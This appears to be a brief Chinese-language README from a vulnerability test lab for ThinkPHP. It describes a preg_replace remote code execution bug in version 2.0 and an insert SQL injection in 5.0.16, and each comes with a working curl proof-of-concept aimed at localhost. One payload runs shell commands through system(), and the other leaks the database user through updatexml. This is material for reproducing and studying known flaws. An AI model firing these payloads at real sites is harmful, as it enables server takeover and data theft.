## preg_replace 代码执行漏洞

测试镜像

* src/thinkphp/2.0/

说明

* 当 `URL_PATHINFO_MODEL` 设置为 `1` 时存在代码执行漏洞

Poc

```
curl -g 'http://127.0.0.1/index.php/module/action/param1/$%7B@system($_POST[0])%7D' -d 0=ls
```


## 5.0.16 insert 注入

测试镜像

* src/thinkphp/5.0.16/

参考文档

* [ThinkPHP框架 5.0.x sql注入漏洞分析](https://paper.seebug.org/564/)

Poc

```
curl '127.0.0.1/public/index.php/index/index/testsql?username[0]=inc&username[1]=updatexml(1,concat(0x7,user(),0x7e),1)&username[2]=1
```

